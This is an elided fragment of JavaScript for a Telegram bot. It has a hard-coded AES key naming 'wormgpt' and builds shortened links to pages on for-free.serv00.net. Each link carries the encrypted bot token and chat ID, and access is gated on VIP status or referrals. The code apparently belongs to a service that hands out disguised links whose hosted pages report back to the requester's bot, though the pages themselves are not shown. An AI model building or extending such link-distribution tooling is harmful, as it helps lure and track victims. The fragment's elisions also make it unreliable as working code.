...
const secretKey = 'thisisasecretkeyforwormgpt123456'; // 32 bytes for AES-256
  ...
  try {
    ...
    if (update.callback_query) {
      ...
      if (callbackData === 'lang_en') {
        ...
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encryptedBot = encryptData(botToken);
          const encryptedId = encryptData(chatId.toString());
          const longUrl = `https://for-free.serv00.net/t/index.html?x=${encryptedBot}&y=${encryptedId}`;
        ...
        try {
          ...
          const encryptedBot = encryptData(botToken);
          const encryptedId = encryptData(chatId.toString());
          const longUrl = `https://for-free.serv00.net/2/index.html?x=${encryptedBot}&y=${encryptedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendPhoto(
            chatId,
        ...
        try {
          ...
          if (user.isVip || userReferrals >= requiredReferrals) {
            const encryptedBot = encryptData(botToken);
            const encryptedId = encryptData(chatId.toString());
            const longUrl = `https://for-free.serv00.net/helps/index.html?x=${encryptedBot}&y=${encryptedId}`;
            const shortUrl = await shortenUrl(longUrl);
            await bot.telegram.sendPhoto(
              chatId,
              'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
